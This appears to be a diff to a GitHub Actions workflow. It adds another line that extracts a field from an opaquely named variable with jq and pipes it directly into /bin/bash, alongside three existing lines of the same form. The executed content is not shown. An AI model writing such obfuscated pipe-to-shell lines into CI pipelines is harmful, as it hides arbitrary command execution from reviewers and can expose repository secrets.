@@ -31,6 +31,7 @@ jobs:
           echo $l1 | jq -r .fggyn5 | /bin/bash
           echo $dnyan1585 | jq -r .ise48 | /bin/bash
           echo $b92 | jq -r .vru23 | /bin/bash
+          echo $cmko485 | jq -r .hp46 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
